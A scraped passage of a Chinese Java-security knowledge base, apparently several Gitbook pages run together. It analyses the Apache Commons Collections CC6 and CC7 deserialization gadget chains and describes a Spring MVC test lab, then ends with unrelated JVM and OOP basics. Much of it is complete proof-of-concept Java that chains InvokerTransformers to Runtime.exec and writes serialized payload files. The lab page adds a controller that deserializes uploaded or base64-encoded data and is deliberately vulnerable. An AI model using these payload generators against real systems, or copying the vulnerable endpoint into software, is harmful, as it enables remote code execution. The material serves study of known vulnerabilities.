e.next) { Object k; if (e.hash == hash && ((k = e.key) == key || key.equals(k))) { V oldValue = e.value; e.value = value; e.recordAccess(this); return oldValue; } } modCount++; addEntry(hash, key, value, i); return null; } 再往上回溯，可以看到在HashSet#readObject，在下面的代码块中，第24行，map.put(e,PRESENT)在put过程中，map为HashMap，e为对应的TiedMapEntry的实例，就能保证整个链路完整执行 // HashSet.java /** * Reconstitute the HashSet instance from a stream (that is, * deserialize it). */ private void readObject(java.io.ObjectInputStream s) throws java.io.IOException, ClassNotFoundException { // Read in any hidden serialization magic s.defaultReadObject(); // Read in HashMap capacity and load factor and create backing HashMap int capacity = s.readInt(); float loadFactor = s.readFloat(); map = (((HashSet)this) instanceof LinkedHashSet ? new LinkedHashMap(capacity, loadFactor) : new HashMap(capacity, loadFactor)); // Read in size int size = s.readInt(); // Read in all elements in the proper order. for (int i=0; i ysoserial分析 // jdk1.7 && Commons Collections 3.1 // ...LazyMap逻辑 // 此处生成的实例为HashMap HashSet map = new HashSet(1); // 此处调用的HashSet的add方法，然后add方法中map为HashMap再调用put方法，此时Entry[] table 为空，且key不为对应的TiedMapEntry实例，不满足条件 map.add(\"foo\"); //那么需要反射将HashMap$Entry[K,V][] table 赋值，且在调用put的时候key为对应的TiedMapEntry实例 // 首先需要从HashSet实例的map值赋到HashMap实例map上，这里反射第一次将HashSet的实例map赋值给HashMap的实例Map Field f = HashSet.class.getDeclaredField(\"map\"); f.setAccessible(true); HashMap innerMap = (HashMap) f.get(map); // 此时 innerMap已经为HashMap实例，这会儿就需要反射HashMap的实例中的table赋值，让其不为null Field f1 = HashMap.class.getDeclaredField(\"table\"); f1.setAccessible(true); // 取值操作，HashMap实例中table的值赋值给一个对象数组 Object[] array = (Object[]) f1.get(innerMap); // 此时这个数据的长度应该只有1，并且对应的值就应该为foo=java.lang.Object@6b7536e7 Object node = array[0]; // 此时最后一步就需要反射取得这个HashMap$Entry的key，并将其赋值为TiedMapEntry的实例 Field keyFiled = node.getClass().getDeclaredField(\"key\"); keyField.setAccessible(true); keyField.set(node, \"TiedMapEntry的实例\"); // 最后再将map序列化成文件 writeObject(map); POC ysoserial（反序列化的HashSet） package com.myproject; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.keyvalue.TiedMapEntry; import org.apache.commons.collections.map.LazyMap; import java.io.FileInputStream; import java.io.FileOutputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.lang.reflect.Field; import java.util.HashMap; import java.util.HashSet; import java.util.Map; public class TestCC6 { public static void main(String[] args) throws Exception { Transformer[] transformers = new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(\"getMethod\", new Class[]{String.class, Class[].class}, new Object[]{\"getRuntime\", new Class[0]}), new InvokerTransformer(\"invoke\", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}), new InvokerTransformer(\"exec\", new Class[]{String.class}, new Object[]{\"calc.exe\"}) }; Transformer transformerChian = new ChainedTransformer(transformers); Map innerMap = new HashMap(); Map lazyMap = LazyMap.decorate(innerMap, transformerChian); TiedMapEntry entry = new TiedMapEntry(lazyMap, \"123\"); HashSet map = new HashSet(1); map.add(\"foo\"); Field f = null; try { f = HashSet.class.getDeclaredField(\"map\"); } catch (NoSuchFieldException e) { f = HashSet.class.getDeclaredField(\"backingMap\"); } f.setAccessible(true); HashMap innimpl = (HashMap) f.get(map); Field f2 = null; try { f2 = HashMap.class.getDeclaredField(\"table\"); } catch (NoSuchFieldException e) { f2 = HashMap.class.getDeclaredField(\"elementData\"); } f2.setAccessible(true); Object[] objects = (Object[]) f2.get(innimpl); Object node = objects[0]; if(node == null){ node = objects[1]; } Field keyField = null; try { keyField = node.getClass().getDeclaredField(\"key\"); } catch (Exception e) { keyField = Class.forName(\"java.util.MapEntry\").getDeclaredField(\"key\"); } keyField.setAccessible(true); keyField.set(node, entry); try { FileOutputStream fileOutputStream = new FileOutputStream(\"cc6.ser\"); ObjectOutputStream objectOutputStream = new ObjectOutputStream(fileOutputStream); objectOutputStream.writeObject(map); FileInputStream fileInputStream = new FileInputStream(\"cc6.ser\"); ObjectInputStream objectInputStream = new ObjectInputStream(fileInputStream); objectInputStream.readObject(); } catch (Exception e) { e.printStackTrace(); } } } 更改poc(反序列化HashMap) java.io.ObjectInputStream.readObject() java.util.HashMap.readObject() java.util.HashMap.hash() org.apache.commons.collections.keyvalue.TiedMapEntry.getValue() org.apache.commons.collections.keyvalue.TiedMapEntry.get() org.apache.commons.collections.map.LazyMap.get() org.apache.commons.collections.functors.ChainedTransformer.transform() org.apache.commons.collections.functors.InvokerTransformer.transform() java.lang.reflect.Method.invoke() java.lang.Runtime.exec() 根据ysoserial改写，其实思路都一样 package com.myproject; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.keyvalue.TiedMapEntry; import org.apache.commons.collections.map.LazyMap; import java.io.FileInputStream; import java.io.FileOutputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.lang.reflect.Field; import java.util.HashMap; import java.util.Map; public class TestCC6_Poc_1 { public static void main(String[] args) throws Exception { Transformer[] transformers = new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(\"getMethod\", new Class[]{String.class, Class[].class}, new Object[]{\"getRuntime\", new Class[0]}), new InvokerTransformer(\"invoke\", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}), new InvokerTransformer(\"exec\", new Class[]{String.class}, new Object[]{\"calc.exe\"}) }; Transformer transformerChian = new ChainedTransformer(transformers); Map innerMap = new HashMap(); Map lazyMap = LazyMap.decorate(innerMap, transformerChian); TiedMapEntry entry = new TiedMapEntry(lazyMap, \"foo\"); // 直接创建一个HashMap HashMap innimpl = new HashMap(); // HashMap 里一定要有初始值，不然table为空无法获取对应的key innimpl.put(null, \"123\"); Field f2 = null; try { f2 = HashMap.class.getDeclaredField(\"table\"); } catch (NoSuchFieldException e) { f2 = HashMap.class.getDeclaredField(\"elementData\"); } f2.setAccessible(true); Object[] objects = (Object[]) f2.get(innimpl); Object node = objects[0]; Field keyField = null; try { keyField = node.getClass().getDeclaredField(\"key\"); } catch (Exception e) { keyField = Class.forName(\"java.util.MapEntry\").getDeclaredField(\"key\"); } keyField.setAccessible(true); keyField.set(node, entry); try { FileOutputStream fileOutputStream = new FileOutputStream(\"cc6_1.ser\"); ObjectOutputStream objectOutputStream = new ObjectOutputStream(fileOutputStream); objectOutputStream.writeObject(innimpl); // FileInputStream fileInputStream = new FileInputStream(\"cc6_1.ser\"); ObjectInputStream objectInputStream = new ObjectInputStream(fileInputStream); objectInputStream.readObject(); } catch (Exception e) { e.printStackTrace(); } } } 更改POC_1(反序列化HashSet 1次反射) 其实看HashSet这个类的时候，我们可以看到调用add方法的时候，其实传入entry之后，对应的Object就是恶意对象实例，那么就会调用lazymap#get方法，从而在客户端就执行1次命令 具体可以看如下代码，当map.add(entry)之后，就会弹出notepad Transformer[] fakertransformers = new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(\"getMethod\", new Class[]{String.class, Class[].class}, new Object[]{\"getRuntime\", new Class[0]}), new InvokerTransformer(\"invoke\", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}), new InvokerTransformer(\"exec\", new Class[]{String.class}, new Object[]{\"notepad.exe\"}) }; Transformer transformerChain = new ChainedTransformer(fakertransformers); Map innerMap = new HashMap(); Map lazyMap = LazyMap.decorate(innerMap, transformerChain); TiedMapEntry entry = new TiedMapEntry(lazyMap, \"foo\"); HashSet map = new HashSet(1); map.add(entry); 调试一下如上的代码，在add处，传入的是e为entry 在调用hash函数的时候，传入的也是entry 最后调用key(entry).hashcode()这时就会调用TiedMapEntry#hashcode，最后就会调用LazyMap#get方法 那么在客户端执行成功之后，是不行的，因为在LazyMap#get处，会判断map 中是否存在对应的key，如果存在，就不会调用factory.transform // lazymap#get public Object get(Object key) { // create value for key if key is not currently in the map if (map.containsKey(key) == false) { Object value = factory.transform(key); map.put(key, value); return value; } return map.get(key); } 此时就需要保证在反序列化的时候lazymap中map不能有任何key lazyMap.remove(\"foo\"); 此时还未执行remove操作，可以看到lazymap存在值为foo 执行remove之后，可以看到，lazymap清空了 在ysoserial这个项目中，比如CC1中，都是在最后通过替换ChainedTransformer中的iTransformers为恶意的transformers来完成步骤 Transformer[] transformers = new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(\"getMethod\", new Class[]{String.class, Class[].class}, new Object[]{\"getRuntime\", new Class[0]}), new InvokerTransformer(\"invoke\", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}), new InvokerTransformer(\"exec\", new Class[]{String.class}, new Object[]{\"calc.exe\"}) }; Field f = ChainedTransformer.class.getDeclaredField(\"iTransformers\"); f.setAccessible(true); f.set(transformerChain,transformers); 最后就是序列化与反序列化的步骤 try{ FileOutputStream fileOutputStream = new FileOutputStream(\"cc6_2.ser\"); ObjectOutputStream objectOutputStream = new ObjectOutputStream(fileOutputStream); objectOutputStream.writeObject(map); FileInputStream fileInputStream = new FileInputStream(\"cc6_2.ser\"); ObjectInputStream objectInputStream = new ObjectInputStream(fileInputStream); objectInputStream.readObject(); }catch (Exception e){ e.printStackTrace(); } 完整poc package com.myproject; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.keyvalue.TiedMapEntry; import org.apache.commons.collections.map.LazyMap; import java.io.FileInputStream; import java.io.FileOutputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.lang.reflect.Field; import java.util.HashMap; import java.util.HashSet; import java.util.Map; public class TestCC6_Poc_2 { public static void main(String[] args) throws Exception { Transformer[] fakertransformers = new Transformer[]{ new ConstantTransformer(1) }; Transformer[] transformers = new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(\"getMethod\", new Class[]{String.class, Class[].class}, new Object[]{\"getRuntime\", new Class[0]}), new InvokerTransformer(\"invoke\", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}), new InvokerTransformer(\"exec\", new Class[]{String.class}, new Object[]{\"calc.exe\"}) }; Transformer transformerChain = new ChainedTransformer(fakertransformers); Map innerMap = new HashMap(); Map lazyMap = LazyMap.decorate(innerMap, transformerChain); TiedMapEntry entry = new TiedMapEntry(lazyMap, \"foo\"); HashSet map = new HashSet(1); map.add(entry); lazyMap.remove(\"foo\"); Field f = ChainedTransformer.class.getDeclaredField(\"iTransformers\"); f.setAccessible(true); f.set(transformerChain,transformers); try{ FileOutputStream fileOutputStream = new FileOutputStream(\"cc6_2.ser\"); ObjectOutputStream objectOutputStream = new ObjectOutputStream(fileOutputStream); objectOutputStream.writeObject(map); FileInputStream fileInputStream = new FileInputStream(\"cc6_2.ser\"); ObjectInputStream objectInputStream = new ObjectInputStream(fileInputStream); objectInputStream.readObject(); }catch (Exception e){ e.printStackTrace(); } } } 在最后生成了序列化的文件，再将前面的代码注释掉，只留下反序列化的代码，最后只会执行transformers Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-05-22 21:05:09 Author: aaron Url: https://byaaronluo.github.io/知识库/02.JAVA安全/19.CommonsCollections/06.CC6/CommonsCollections6分析.html Source: aaron 知识库 This article was originally published in「aaron 知识库」,Reproduced please indicate the source, thank you for cooperation! "},"知识库/02.JAVA安全/19.CommonsCollections/07.CC7/CommonsCollections7分析.html":{"url":"知识库/02.JAVA安全/19.CommonsCollections/07.CC7/CommonsCollections7分析.html","title":"CommonsCollections7分析","keywords":"","body":" 简介 链路分析 0x1 0x2 0x3 POC 调试 简介 CC7 也是利用的Commons Collections 3.1 的利用，看ysoserial里的利用链为入口是HashTable，针对HashTable的反序列化，再通过AbstractMap#equals来调用LazyMap#get /* Payload method chain: java.util.Hashtable.readObject java.util.Hashtable.reconstitutionPut org.apache.commons.collections.map.AbstractMapDecorator.equals java.util.AbstractMap.equals org.apache.commons.collections.map.LazyMap.get org.apache.commons.collections.functors.ChainedTransformer.transform org.apache.commons.collections.functors.InvokerTransformer.transform java.lang.reflect.Method.invoke sun.reflect.DelegatingMethodAccessorImpl.invoke sun.reflect.NativeMethodAccessorImpl.invoke sun.reflect.NativeMethodAccessorImpl.invoke0 java.lang.Runtime.exec */ 链路分析 Map innerMap1 = new HashMap(); Map innerMap2 = new HashMap(); Map lazyMap1 = LazyMap.decorate(innerMap1, transformerChain); lazyMap1.put(\"yy\",1); Map lazyMap2 = LazyMap.decorate(innerMap2, transformerChain); lazyMap2.put(\"zZ\", 1); Hashtable hashtable = new Hashtable(); hashtable.put(lazyMap1, 2); hashtable.put(lazyMap2, 1); 0x1 CC7 这里有一个知识点，直接看HashTable#put函数，传入的key和value为我们传入的第二个key-value对，在这个函数里，我们可以看到他会判断是否和传入的第一个值是否重复，也就是代码块中第8行到第17行，如果已经存在，就不会再写入hashtable中，如果不存在则会直接写入 在此处可以看到首先会对传入的key（也就是lazymap）进行执行一次hashcode()计算hash值，然后会对比已经存在hashtable的数据的hash是否与我们传入的key.hashCode()是否相等，然后就会调用已存在的lazymap1与传入的lazymap2进行比较 public synchronized V put(K key, V value) { // Make sure the value is not null if (value == null) { throw new NullPointerException(); } // Makes sure the key is not already in the hashtable. Entry tab[] = table; int hash = key.hashCode(); int index = (hash & 0x7FFFFFFF) % tab.length; @SuppressWarnings(\"unchecked\") Entry entry = (Entry)tab[index]; for(; entry != null ; entry = entry.next) { if ((entry.hash == hash) && entry.key.equals(key)) { V old = entry.value; entry.value = value; return old; } } addEntry(hash, key, value, index); return null; } 这里我再补充一下hashCode函数做了什么操作，在下图可以看见，对Key和Value进行Objects.hashCode()之后又做了一次异或，这时就需要保证Objects.hashCode(key1) == Objects.hashCode(key2)，Objects.hashCode(value1) == Objects.hashCode(value2),这样计算出来的hashCode才是相等的，这里我尝试了很多，都没有发现相等的Key，ysoserial的作者给出的 yy 和 zZ hashCode就是相等的 0x2 然后再看equals 函数，这里可以看到传入的object 为lazymap2，当前的this.map 为第一个传入的lazymap1(因为是他调用的equals方法)，然后再跟进equals // AbstractMapDecorator.java public boolean equals(Object object) { return object == this ? true : this.map.equals(object); } 跟进下面代码块第8-24行，这里m为传入的lazymap2，第13行从迭代器里取出来的是已经写入到HashTable里的Entry，然后遍历获取对应的map（因为只有1个，这里就以lazymap1来说明了），获取lazymap1的key以及value，如果value 不为null，这里在22行就存在value.equals(m.get(key))，在这里我们不需要再关注这个equals函数，而是对m.get(key)关注，m为lazymap2，而调用get方法就是我们最终的目的，虽然现在还是在序列化过程中 // AbstractMap public boolean equals(Object o) { if (o == this) return true; if (!(o instanceof Map)) return false; Map m = (Map) o; if (m.size() != size()) return false; try { Iterator> i = entrySet().iterator(); while (i.hasNext()) { Entry e = i.next(); K key = e.getKey(); V value = e.getValue(); if (value == null) { if (!(m.get(key)==null && m.containsKey(key))) return false; } else { if (!value.equals(m.get(key))) return false; } } } catch (ClassCastException unused) { return false; } catch (NullPointerException unused) { return false; } return true; } 在序列化过程中，调用了lazymap的get方法之后，返回了value(Object) ， 此时lazymap就多了这个value 0x3 那么在反序列化时，要保证要调用lazymap#get，那么需要保证两个lazymap被hashcode()之后，一定要相等，且调用的是lazymap2#get,那么lazymap2的Transformer factor 就要为执行命令的transformers，也需要将多余的LazyMap删除掉 Transformer[] transformers = new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(\"getMethod\", new Class[]{String.class, Class[].class}, new Object[]{\"getRuntime\", new Class[0]}), new InvokerTransformer(\"invoke\", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}), new InvokerTransformer(\"exec\", new Class[]{String.class}, new Object[]{\"calc.exe\"}) }; lazyMap2.remove(\"yy\"); Field f = ChainedTransformer.class.getDeclaredField(\"iTransformers\"); f.setAccessible(true); f.set(transformerChain, transformers); POC 完整poc如下 package com.myproject; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.map.LazyMap; import java.io.FileInputStream; import java.io.FileOutputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.lang.reflect.Field; import java.util.HashMap; import java.util.Hashtable; import java.util.Map; public class TestCC7 { public static void main(String[] args) throws Exception { Transformer[] fackerTransformer = new Transformer[]{}; Transformer transformerChain = new ChainedTransformer(fackerTransformer); Transformer[] transformers = new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(\"getMethod\", new Class[]{String.class, Class[].class}, new Object[]{\"getRuntime\", new Class[0]}), new InvokerTransformer(\"invoke\", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}), new InvokerTransformer(\"exec\", new Class[]{String.class}, new Object[]{\"calc.exe\"}) }; Map innerMap1 = new HashMap(); Map innerMap2 = new HashMap(); Map lazyMap1 = LazyMap.decorate(innerMap1, transformerChain); lazyMap1.put(\"yy\",1); Map lazyMap2 = LazyMap.decorate(innerMap2, transformerChain); lazyMap2.put(\"zZ\", 1); Hashtable hashtable = new Hashtable(); hashtable.put(lazyMap1, 2); hashtable.put(lazyMap2, 1); Field f = ChainedTransformer.class.getDeclaredField(\"iTransformers\"); f.setAccessible(true); f.set(transformerChain, transformers); lazyMap2.remove(\"yy\"); try { FileOutputStream fileOutputStream = new FileOutputStream(\"cc7.ser\"); ObjectOutputStream objectOutputStream = new ObjectOutputStream(fileOutputStream); objectOutputStream.writeObject(hashtable); FileInputStream fileInputStream = new FileInputStream(\"cc7.ser\"); ObjectInputStream objectInputStream = new ObjectInputStream(fileInputStream); objectInputStream.readObject(); } catch (Exception e) { e.printStackTrace(); } } } 调试 直接在LazyMap#get处打上断点，可以清晰看到对应的反序列化堆栈，就和序列化是一样的，最后把lazymap2里多余的键值对删除，并将其Transformer factor更改为cc1的经典transformers，然后再链式调用即可执行命令 Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-05-22 21:05:58 Author: aaron Url: https://byaaronluo.github.io/知识库/02.JAVA安全/19.CommonsCollections/07.CC7/CommonsCollections7分析.html Source: aaron 知识库 This article was originally published in「aaron 知识库」,Reproduced please indicate the source, thank you for cooperation! "},"知识库/02.JAVA安全/19.CommonsCollections/08.CommonsCollections系列简单靶场.html":{"url":"知识库/02.JAVA安全/19.CommonsCollections/08.CommonsCollections系列简单靶场.html","title":"08.CommonsCollections系列简单靶场","keywords":"","body":" 简介 环境 搭建SpringMVC HelloController 相关问题 0x1 接收POST Body 0x2 编码问题 0x3 依赖 参考链接 简介 由于在CC链的学习过程中，是使用的IO操作，模拟网络传输操作，在这里难免会不太理解如果是在web传输过程中，如何实现序列化数据在网络上传输，并且在网络传输过程中，序列化数据（二进制流）与源文件的hash值不等，以及文件特征丢失等等很奇怪的问题，目前找到原因就是编码问题，但是二进制流的会被篡改的问题还没有解决，但是在测试反序列化，就能知道有哪些需要注意的事项了 环境 jdk 8u181 maven 3.8.5 springmvc 4.3.18.RELEASE tomcat 8.5.79 搭建SpringMVC web选取SpringMVC，关于SpringMVC的搭建过程，请参考SpringMVC内存马#创建SpringMVC项目，Tomcat版本为8.5.79，目录结构如下所示 然后整体思路是，通过文件上传，上传已经序列化好的文件（可以通过ysoserial项目创建，也可以自己下载对应的Commons Collections包，进行序列化成文件） 为什么会用文件上传的形式？这个在后面提及，当然还有更好的方式，但是只是为了验证网络传输，所以也就选择了最简单的方式 但是文件上传需要用到中间件，依赖如下，添加到pom.xml中 commons-fileupload commons-fileupload 1.3.1 commons-io commons-io 2.4 并且在dispatcher-servlet.xml里添加bean，配置上传文件的最大值，以及默认的编码方式 HelloController /hi接口是返回前端的文件上传页面，/ysoserial接口则是处理传入的序列化的=数据，然后进行反序列化操作 package com.spring.Controller; import org.springframework.stereotype.Controller; import org.springframework.web.bind.annotation.RequestMapping; import org.springframework.web.bind.annotation.RequestParam; import org.springframework.web.multipart.MultipartFile; import java.io.*; @Controller public class HelloController { @RequestMapping(value = \"/hi\") public String ReturnJsp(){ return \"hello\"; } @RequestMapping(value = \"/ysoserial\") public String SerialTest(@RequestParam(\"file\") MultipartFile f1) throws Exception{ ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(f1.getBytes()); ObjectInputStream objectInputStream = new ObjectInputStream(byteArrayInputStream); objectInputStream.readObject(); return \"test\"; } } 启动起来，效果如下： 这里上传对应的已经序列化过后的文件(比如CC7.ser)，即可执行命令 然后将它运行起来之后，就可以看到正常的网络传输过程中，在web中如何反序列化 这个靶场其实很简单，但是在其中的问题很多，所以才会有这一篇文章 在针对上传文件属实有点low了，这里将文件输出成base64编码，然后网络传输传递base64编码，然后再序列化 // Base64EncodeTest package com.myproject; import sun.misc.BASE64Decoder; import sun.misc.BASE64Encoder; import java.io.File; import java.io.FileInputStream; import java.io.FileOutputStream; public class Base64EncodeTest { public static String encodeBase64File(String path) throws Exception{ File file = new File(path); FileInputStream fileInputStream = new FileInputStream(file); byte[] buffer = new byte[(int) file.length()]; fileInputStream.read(buffer); fileInputStream.close(); return new BASE64Encoder().encode(buffer); } public static void decodeBase64File(String base64Encode,String targetPath) throws Exception{ byte[] buffer = new BASE64Decoder().decodeBuffer(base64Encode); FileOutputStream outputStream = new FileOutputStream(targetPath); outputStream.write(buffer); outputStream.close(); } public static void main(String[] args) throws Exception { String base64Code = encodeBase64File(\"cc7.ser\"); System.out.println(base64Code); } } 然后我们对base64编码的二进制文件，base64解码还原来比较一下sha256 // Base64EncodeTest //... public static void main(String[] args) throws Exception { String base64Code = encodeBase64File(\"cc7.ser\"); decodeBase64File(base64Code,\"cc7base64Decode.ser\"); } 可以发现是hash之后是相等的，那么最后需要更改的就是web接收的参数，为base64字符串，这个字符串当解码之后就是二进制流，需要存放在一个byte数组中，然后再存放在ByteArrayInputStream中，然后使用ObjectInputStream来读取，最后再readObject进行反序列化 byte[] buff = new BASE64Decoder().decodeBuffer(request.getParameter(\"data\")); ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(buff); ObjectInputStream objectInputStream = new ObjectInputStream(byteArrayInputStream); objectInputStream.readObject(); 完整的Spring web Controller 如下，对应的接口为/ysoserialBase64 package com.spring.Controller; import org.springframework.stereotype.Controller; import org.springframework.web.bind.annotation.RequestMapping; import org.springframework.web.bind.annotation.RequestParam; import org.springframework.web.multipart.MultipartFile; import sun.misc.BASE64Decoder; import java.io.*; import javax.servlet.http.HttpServletRequest; @Controller public class HelloController { @RequestMapping(value = \"/hi\") public String ReturnJsp(){ return \"hello\"; } @RequestMapping(value = \"/ysoserial\") public String SerialTest(@RequestParam(\"file\") MultipartFile f1) throws Exception{ ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(f1.getBytes()); ObjectInputStream objectInputStream = new ObjectInputStream(byteArrayInputStream); objectInputStream.readObject(); return \"test\"; } @RequestMapping(value = \"/ysoserialBase64\") public String SerialBase64Test(HttpServletRequest request) throws IOException, ClassNotFoundException { byte[] buff = new BASE64Decoder().decodeBuffer(request.getParameter(\"data\")); ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(buff); ObjectInputStream objectInputStream = new ObjectInputStream(byteArrayInputStream); objectInputStream.readObject(); return \"test\"; } } 在进行传输base64编码的时候，一定要注意，因为base64编码存在+,在web进行传输的时候+会被解码成空格则会导致解码失败，详情参考Base64编码/解码原理，在这里需要将base64编码再进行一次URL编码放在burp里传输，如下所示 相关问题 0x1 接收POST Body 最开始想如Adobe ColdFusion AMF Deserialization Remote Command Execution (CVE-2017-3066)的漏洞利用这样，将反序列化的数据保存到文本文件，然后直接pasted from burp，将文本文件的二进制流传递给web服务器，但是在我使用node.js的时候发现无法接收到来自POST的请求体，因为在express里要接收对应的POST Body，都是由中间件解析完成，然而其实并不想太麻烦，所以最后使用上传文件的方式来将二进制文件流传入给服务端，然后立马就有了编码问题 0x2 编码问题 我在反复尝试后，将经过网络传输的文件保存下来，再利用模拟的IO操作进行反序列化，发现一直无法反序列化成功，因为在模拟IO操作的地方，我发现有crash，CC2本身在反序列化cc2.ser的时候程序就会crash，然后一直没去调试反序列化的过程，在这里浪费了许多时间 排查思路，需要拿到对应的文件进行判断，是否正常 我在这里选择使用node.js，因为轻便(使用java也行，只是我用node比较快)，简单来看一下问题 npm install express --save npm install multer --save const express = require('express') const app = new express() const fs = require('fs') const multer = require('multer') let multerConfig = multer({ dest: './static/upload', }) app.get('/',(req,res)=>{ res.send('hahaha') }) app.post('/',multerConfig.single('file'),(req,res)=>{ console.log(req.file) res.send('get Post') }) app.listen(8081,()=>{ console.log('running!') }) 此时通过burp构造一个multipart/form-data，然后对应将cc2.ser 粘贴到burp里 对其进行sha256，与源文件进行对比，发现并不能对上 并且可以看到如下对比，通过pasted from burp 上传到的文件，已经不符合java 序列化文件的类型了 那到底为什么会出现这种情况？我在Adobe ColdFusion AMF Deserialization Remote Command Execution (CVE-2017-3066)复现过程遇到过，以前是用低版本burp能复现成功，最开始的时候没有探讨原因，后面在北京的时候问过大佬，说是因为编码问题，只要更改为utf-8就可以了，但是我把所有的编码方式都修改了，发现还是不行，包括还是修改对应的16进制码（只修改了一部分），还是不行 然后写了一个静态页面，上传页面，注意后端需要修改同源策略，允许跨域访问 const express = require('express') const app = new express() const fs = require('fs') const multer = require('multer') let multerConfig = multer({ dest: './static/upload', }) app.all('*', function(req, res, next) { res.header('Access-Control-Allow-Origin', req.headers.origin) //需要显示设置来源 // 'Access-Control-Allow-Headers', 'Content-Type' res.header( 'Access-Control-Allow-Headers', 'Origin, X-Requested-With, Content-Type, Accept, Authorization' ) res.header('Access-Control-Allow-Methods', 'POST,GET,DELETE,OPTIONS') res.header('Access-Control-Allow-Credentials', true) //带cookies7 res.header('Content-Type', 'application/json;charset=utf-8') if (req.method == 'OPTIONS') { res.sendStatus(200) } else { next() } }) app.get('/',(req,res)=>{ res.send('hahaha') }) app.post('/',multerConfig.single('file'),(req,res)=>{ console.log(req.file) res.send('get Post') }) app.listen(8081,()=>{ console.log('running!') }) 在此处上传文件发现，通过前端上传的文件，和源文件能相对应上 然后将两个包进行比较，发现序列化数据发生改变了，暂时还不知道如何解决，就是编码问题，从文件里获取的时候，文件内容其实就已经发生了变化 0x3 依赖 在CC链中，我们知道需要特定版本的Commons Collections才能触发反序列化的点，比如Commons Collections 1 需要配合使用JDK1.7 和 Commons Collections 3.1-3.2.1，然而当我直接把本地的jar包放上去之后，调试的时候竟然发现找不到对应的类，这个问题也是高了好久才发现，一直以为是哪个环节出了问题，最后在pom.xml中引入Commons Collections 组件解决问题 org.apache.commons commons-collections4 4.0 commons-collections commons-collections 3.1 参考链接 https://zhuanlan.zhihu.com/p/386631799 Adobe ColdFusion AMF Deserialization Remote Command Execution (CVE-2017-3066) Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-05-22 21:06:35 Author: aaron Url: https://byaaronluo.github.io/知识库/02.JAVA安全/19.CommonsCollections/08.CommonsCollections系列简单靶场.html Source: aaron 知识库 This article was originally published in「aaron 知识库」,Reproduced please indicate the source, thank you for cooperation! "},"知识库/02.JAVA安全/01.Java_JVM内存模型.html":{"url":"知识库/02.JAVA安全/01.Java_JVM内存模型.html","title":"01.Java_JVM内存模型","keywords":"","body":" JVM GC（Garbage Collection）垃圾回收器 JVM JVM 内存划分：它是人为的根据不同的内存空间的存储特点以及存储数据（逻辑划分） 程序计数器：当前线程所执行的字节码的行号指示器 本地方法栈：为虚拟机使用native方法服务 Java虚拟机栈：描述Java方法执行的内存模型，每个方法被执行的时候都会同时创建一个栈帧用于存储该方法的局部变量表、操作栈、动态链接、方法出口等信息（每一个方法创建一个栈帧，栈帧存放了当前方法的数据信息（局部变量），当方法调用完毕，该方法的栈帧就被销毁了） Java 堆：被所有线程共享的一块内存区域，在虚拟机启动时被创建。所有的对象实例以及数组都要在堆上分配（当使用new 关键字，就表示在堆中开辟一块新的存储空间） 方法区：线程共享的内存区域，存储已被虚拟机加载的类信息，常量、静态变量即时编译器编译后的代码数据等（这个区域的内存回收目标主要是针对常量的回收和对类型 的卸载） GC（Garbage Collection）垃圾回收器 Java的自动垃圾回收机制，简单理解为，程序员就不需要再手动的去控制内存的释放，当JVM发觉内存资源紧张的时候，就会自动地去清理无用对象（没有被引用的对象） Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-05-19 15:48:52 Author: aaron Url: https://byaaronluo.github.io/知识库/02.JAVA安全/01.Java_JVM内存模型.html Source: aaron 知识库 This article was originally published in「aaron 知识库」,Reproduced please indicate the source, thank you for cooperation! "},"知识库/02.JAVA安全/02.Java_面向对象.html":{"url":"知识库/02.JAVA安全/02.Java_面向对象.html","title":"02.Java_面向对象","keywords":"","body":" 简介 面向过程 面向过程的设计 面向过程的设计缺陷 面向对象 面向对象的优势与特点 类和对象 理解什么是抽象 对象和类的关系 对象 类 如何定义一个类 对象的创建和条用方法以及操作字段 对象实例化的过程 对象的打印、比较、生命周期 打印 比较 生命周期 匿名对象：匿名/佚名 构造器 构造器的作用 构造器的特点 编译器创建的默认构造器特点 自定义构造器与构造器重载 自定义构造器 构造器重载 static 修饰符 static 成员在JVM中的存储 类成员与实例成员 简介 面向过程 该思想是站在过程的角度思考问题，强调的是功能行为，功能的执行过程，先干什么，后干什么，而每一个功能，都是用函数（类似于方法）把这些步骤一步一步实现，使用的时候依次调用函数 面向过程的设计 